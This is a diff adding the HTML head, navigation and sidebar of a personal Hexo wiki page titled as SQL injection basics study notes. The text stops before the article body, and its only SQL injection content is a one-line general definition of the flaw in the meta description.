@@ -1,0 +1,910 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+    <title>sql注入基础学习 | kn0sky&#39;wiki</title>
+    
+    
+        <meta name="keywords" content="kn0sky">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="sql注入基础学习sql注入定义&amp;原理Web应用程序对用户输入的合法性没有判断，参数可控，并带入数据库查询，导致攻击者可以通过构造不同的SQL语句来实现对数据库的操作 任何提交给服务器的数据都可能会被传送给数据库函数，并且可能得到不安全的处理 MySQL基础Mysql在version 5以后，便多了一个基础库information_schema，存储的的是mysql的结构信息。除此以外，M">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入基础学习">
+<meta property="og:url" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="kn0sky&#39;wiki">
+<meta property="og:description" content="sql注入基础学习sql注入定义&amp;原理Web应用程序对用户输入的合法性没有判断，参数可控，并带入数据库查询，导致攻击者可以通过构造不同的SQL语句来实现对数据库的操作 任何提交给服务器的数据都可能会被传送给数据库函数，并且可能得到不安全的处理 MySQL基础Mysql在version 5以后，便多了一个基础库information_schema，存储的的是mysql的结构信息。除此以外，M">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/image-20200613190732540.png">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/image-20200613193941882.png">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/image-20200613200123451.png">
+<meta property="og:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/image-20200614165226665.png">
+<meta property="article:published_time" content="2020-06-13T02:57:19.000Z">
+<meta property="article:modified_time" content="2020-06-14T09:57:03.000Z">
+<meta property="article:author" content="kn0sky">
+<meta property="article:tag" content="kn0sky">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://kn0sky.com/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/image-20200613190732540.png">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="kn0sky&#39;wiki" type="application/atom+xml">
+    
+
+    
+        <link rel="icon" href="/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+</html>
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">kn0sky&#39;wiki</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id="categories">
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id="allExpand" href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            XCTF攻防世界WP
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            新手练习区
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            REVERSE
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/XCTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWP/%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/REVERSE/re001-open-source/">open-source Write Up</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            备忘笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/">常用工具备忘录</a></li>  <li class="file"><a href="/wiki/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E5%BF%98%E5%BD%95/">搭建hexo博客备忘录</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            51单片机学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A801--LED%E6%B5%81%E6%B0%B4%E7%81%AF/">51单片机入门01--LED流水灯</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A802--%E6%95%B0%E7%A0%81%E7%AE%A1/">51单片机入门02--数码管</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A803--%E6%8C%89%E9%94%AE/">51单片机入门03--按键</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%85%A5%E9%97%A804--%E5%AE%9A%E6%97%B6&%E8%AE%A1%E6%95%B0%E5%99%A8/">51单片机入门04--定时&计数器</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            C++学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C++%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C++/">C++基础01--初见C++</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            C语言学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81C%E8%AF%AD%E8%A8%80/">C语言基础01--初见C语言</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8002--%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/">C语言基础02--条件语句</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8003--%E5%AE%8F&%E5%87%BD%E6%95%B0&%E6%95%B0%E7%BB%84/">C语言基础03--宏&函数&数组</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8004--%E6%8C%87%E9%92%88/">C语言基础04--指针</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8005--%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/">C语言基础05--字符串操作</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8006--%E5%AD%98%E5%82%A8%E7%B1%BB&%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">C语言基础06--存储类&内存管理</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8007--%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">C语言基础07--文件操作</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8008--%E7%BB%93%E6%9E%84%E4%BD%93/">C语言基础08--结构体</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%8009--C%E9%A2%84%E5%A4%84%E7%90%86%E5%99%A8%E5%92%8CC%E5%BA%93/">C语言基础09--C预处理器和C库</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Web安全学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            SQLi
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            实战
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/%E5%AE%9E%E6%88%98/%E6%9F%90%E7%BD%91%E7%AB%99%E5%AD%98%E5%9C%A8%E4%BA%8B%E4%BB%B6%E5%9E%8Bsql%E6%B3%A8%E5%85%A501/">某网站存在事件型sql注入01</a></li>  </ul> 
+                    </li> 
+                     <li class="file active"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQLi/sqli%E5%9F%BA%E7%A1%80/">sql注入基础学习</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            XSS
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            练习平台
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/%E7%BB%83%E4%B9%A0%E5%B9%B3%E5%8F%B0/XSS_Challenges/">XSS_Challenges Write Up</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/">XSS基础学习</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            前端入门学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%89%8D%E7%AB%AF%E5%85%A5%E9%97%A801--HTML&CSS%E5%9F%BA%E7%A1%80/">前端入门01--HTML和CSS基础</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            半导体物理学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%8A%E5%AF%BC%E4%BD%93%E7%89%A9%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8D%8A%E5%AF%BC%E4%BD%93%E7%89%A9%E7%90%8601--%E8%83%BD%E5%B8%A6%E7%90%86%E8%AE%BA/">半导体物理01--能带理论</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            原理笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/%E5%AF%84%E5%AD%98%E5%99%A8%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84/">寄存器逻辑结构</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%8E%9F%E7%90%86%E7%AC%94%E8%AE%B0/%E5%86%85%E5%AD%98/">内存</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            汇编基础学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8001--%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/">汇编基础01：基础概念</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8002--%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/">汇编基础02：第一个程序</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8003--%E6%95%B0%E5%AD%A6%E8%BF%90%E7%AE%97&%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/">汇编基础03：数学运算&逻辑运算</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8004--%E5%BE%AA%E7%8E%AF/">汇编基础04：循环</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8005--%E5%A0%86%E6%A0%88/">汇编基础05：堆栈</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8006--%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%81%E6%8C%87%E4%BB%A4/">汇编基础06：数据传送指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8007--%E6%AF%94%E8%BE%83%E6%8C%87%E4%BB%A4/">汇编基础07：比较指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8008--JCC%E6%8C%87%E4%BB%A4/">汇编基础08： JCC 转移指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8009--%E4%BC%A0%E9%80%81%E6%8C%87%E4%BB%A4/">汇编基础09--传送指令</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8012--%E6%95%B0%E7%BB%84%E5%92%8C%E7%BB%93%E6%9E%84%E4%BD%93/">汇编基础12--数组和结构体</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8010--%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0/">汇编基础10--使用函数</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8011--win32%E6%B1%87%E7%BC%96/">汇编基础11--win32汇编</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E4%BD%9C%E4%B8%9A--%E7%94%B5%E8%AF%9D%E7%B0%BF/">汇编作业--电话簿</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%8013--%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80/">汇编基础13--间接寻址</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            逆向入门学习笔记
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8001--%E5%88%9D%E8%A7%81%E9%80%86%E5%90%91/">逆向基础01--初见逆向</a></li>  <li class="file"><a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%8002--%E5%88%9D%E8%AF%95%E7%A0%B4%E8%A7%A3/">逆向基础02--初试破解</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            审计笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            CMS审计
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            6KZZv1.4
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/CMS%E5%AE%A1%E8%AE%A1/6KZZv1.4/main/"></a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A001--%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/">代码审计学习01--搭建php调试环境</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            折腾笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            博客搭建
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BAwiki/">使用hexo搭建个人wiki</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%80%9F%E5%8A%A9%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%9E%E7%8E%B0hexo%E5%85%A8%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/">借助云服务器实现hexo全自动部署</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/hexo%E8%81%94%E5%8A%A8Typora/">hexo联动Typora</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            手机连接电脑
+                        </a>
